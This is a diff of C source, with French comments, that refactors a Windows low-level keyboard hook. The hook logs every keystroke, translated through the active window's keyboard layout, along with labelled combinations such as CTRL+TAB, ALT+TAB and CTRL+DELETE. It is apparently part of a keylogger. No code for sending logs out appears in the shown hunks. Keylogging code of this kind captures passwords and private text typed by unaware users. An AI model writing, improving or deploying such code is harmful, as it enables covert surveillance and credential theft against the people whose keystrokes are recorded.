@@ -71,60 +71,73 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         return CallNextHookEx(NULL, nCode, wParam, lParam);
 
     KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
-    // log sur KEYDOWN pour les touches imprimables et sur KEYUP pour les modifiers
+    DWORD vkCode = pKeyboard->vkCode;
+
+    // --- Gestion de CTRL (DOWN) ---
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-		DWORD vkCode = pKeyboard->vkCode;
-
-		if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
-			ctrl_is_down = 1;
-			return CallNextHookEx(NULL, nCode, wParam, lParam);
-		}
-
-		// Gestion de TAB avec CTRL ou ALT
-		if (vkCode == VK_TAB) {
-			if (ctrl_is_down || (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
-				suppress_ctrl_up = 1;
-				LogKey(" [CTRL+TAB] ");
-				return CallNextHookEx(NULL, nCode, wParam, lParam);
-			} else if (GetAsyncKeyState(VK_MENU) & 0x8000) {
-				LogKey(" [ALT+TAB] ");
-				return CallNextHookEx(NULL, nCode, wParam, lParam);
-			} else {
-				LogKey(" [TAB] ");
-			}
-		}
-
-        // gestion de la locale et état des touches (AZERTY, majuscules...)
-        BYTE keyboardState[256] = {0};
-        if (!GetKeyboardState(keyboardState)) {
-            // si échec, on continue avec l'état par défaut (tous à 0)
+        if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+            ctrl_is_down = 1;
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
 
-        // maj état des modificateurs spécifiques pour hook global
+        // --- Gestion de TAB (priorité absolue pour éviter les conflits) ---
+        if (vkCode == VK_TAB) {
+            // Ignorer WM_SYSKEYDOWN pour TAB (car souvent intercepté par Windows)
+            if (wParam == WM_SYSKEYDOWN) {
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+            // Vérifier si CTRL est enfoncé
+            if (ctrl_is_down || (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
+                suppress_ctrl_up = 1;
+                LogKey(" [CTRL+TAB] ");
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+            // Vérifier si ALT est enfoncé
+            else if (GetAsyncKeyState(VK_MENU) & 0x8000) {
+                LogKey(" [ALT+TAB] ");
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+            // TAB seul
+            else {
+                LogKey(" [TAB] ");
+            }
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
+        }
+    }
+
+    // --- Gestion des autres touches (y compris CTRL+autres) ---
+    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+        // Gestion de la locale et état des touches (AZERTY, majuscules...)
+        BYTE keyboardState[256] = {0};
+        if (!GetKeyboardState(keyboardState)) {
+            // Si échec, on continue avec l'état par défaut (tous à 0)
+        }
+
+        // Mise à jour de l'état des modificateurs
         keyboardState[VK_SHIFT]   = (GetKeyState(VK_SHIFT)  & 0x8000) ? 0x80 : 0;
         keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL)& 0x0001) ? 0x01 : 0;
         keyboardState[VK_CONTROL] = (GetKeyState(VK_CONTROL)& 0x8000) ? 0x80 : 0;
         keyboardState[VK_MENU]    = (GetKeyState(VK_MENU)   & 0x8000) ? 0x80 : 0;
 
-        // récup de la locale du process au premier plan
+        // Récupération de la locale du processus au premier plan
         HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 
-        // essayer de récupérer le caractère correspondant (sera utilisé si pas Ctrl)
+        // Essayer de récupérer le caractère correspondant
         WCHAR unicodeBuffer[8] = {0};
         int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 7, 0, keyboardLayout);
 
+        // Vérifier si CTRL est enfoncé
         int ctrlDown = ctrl_is_down || ((GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0);
         if (ctrlDown) {
-            // touches spéciales avec Ctrl : les traiter d'abord pour éviter le fallback générique
-            if (vkCode == VK_TAB) { suppress_ctrl_up = 1; LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            // Touches spéciales avec Ctrl
+            if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
             else if (vkCode == VK_SPACE) { suppress_ctrl_up = 1; LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
             else if (vkCode == VK_BACK) { suppress_ctrl_up = 1; LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_DELETE) { suppress_ctrl_up = 1; LogKey(" [CTRL+DELETE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
 
-            // si la touche est une lettre ou un chiffre, afficher directement le VK
+            // Si la touche est une lettre ou un chiffre
             if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
                 char comboBuf[8];
-                // utiliser la lettre majuscule pour l'affichage
                 comboBuf[0] = (char)vkCode;
                 comboBuf[1] = '\0';
                 char out[16];
@@ -134,7 +147,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
 
-            // essayer d'obtenir un nom lisible via GetKeyNameTextA (fallback)
+            // Essayer d'obtenir un nom lisible via GetKeyNameTextA
             CHAR keyName[64] = {0};
             LONG lParamForName = (pKeyboard->scanCode << 16);
             if (pKeyboard->flags & LLKHF_EXTENDED) lParamForName |= 1<<24;
@@ -146,7 +159,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
 
-            // si non reconnu, logger code hex en fallback et empêcher double-écriture
+            // Si non reconnu, logger le code hexadécimal
             char comboBufHex[32];
             snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%lX] ", (unsigned long)vkCode);
             suppress_ctrl_up = 1;
@@ -154,10 +167,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
 
-        // touches spéciales human readable (sans Ctrl)
+        // Touches spéciales sans Ctrl
         if (vkCode == VK_RETURN) LogKey(" [ENTER]\n");
         else if (vkCode == VK_BACK) LogKey(" [BACKSPACE] ");
-        else if (vkCode == VK_TAB) LogKey(" [TAB] ");
         else if (vkCode == VK_SPACE) LogKey(" ");
         else {
             if (result > 0) {
@@ -167,8 +179,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 LogKey(utf8Buffer);
             }
         }
-    } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-        DWORD vkCode = pKeyboard->vkCode;
+    }
+
+    // --- Gestion du relâchement des touches (KEYUP) ---
+    else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
             ctrl_is_down = 0;
             if (suppress_ctrl_up) {
@@ -180,6 +194,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             LogKey(" [ALT] ");
         }
     }
+
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
